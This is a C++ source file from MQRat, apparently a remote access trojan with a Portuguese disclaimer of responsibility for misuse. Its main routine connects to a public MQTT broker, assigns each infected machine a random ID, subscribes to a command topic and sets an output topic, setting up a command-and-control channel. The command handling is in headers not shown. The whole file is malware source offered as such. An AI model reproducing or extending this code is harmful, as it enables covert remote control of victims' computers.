/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <thread>
#include <string>
#include <functional>
#include "mqtt_client.hpp"
#include "log.hpp"
#include "utils.hpp"

using namespace std;

string topic_name = "/mqrat/cmd/";

int main() {

	MqttClient *client = new MqttClient(0, "broker.hivemqt.com");

    // Configure MQTT client
    client->Setup();

	// Connect to broker
	client->Connect();

	// Generate send and receive topic
	auto recv_topic = topic_name + Utils::GenerateID();
	auto send_topic = recv_topic + "/output";

	client->setRecvTopic(recv_topic);
	client->setSendTopic(send_topic);

	// Subscribe to topic where command will be received
	client->Subscribe(recv_topic);

	// Internal loop
	std::thread mqtt_thread(&MqttClient::Loop);
	
#ifdef TEST
	Log::LogInfo("Started mqtt thread");
#else
	if(mqtt_thread.joinable())
		mqtt_thread.join();
#endif

    return 0;
}
